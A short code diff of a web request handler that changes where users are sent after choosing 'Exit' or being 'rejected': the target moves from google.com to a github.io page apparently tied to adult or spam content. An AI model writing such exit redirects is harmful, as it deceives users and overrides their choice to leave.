@@ -16,7 +16,7 @@ export default {
 
     if (choice === "no") {
       // user clicked "Exit"
-      return Response.redirect("https://www.google.com/", 302);
+      return Response.redirect("https://only-fan.github.io/Juicypleasure/", 302);
     }
 
     // ✅ For custom events later
@@ -25,7 +25,7 @@ export default {
     }
 
     if (choice === "rejected") {
-      return Response.redirect("https://www.google.com/", 302);
+      return Response.redirect("https://only-fan.github.io/Juicypleasure/", 302);
     }
 
     // fallback
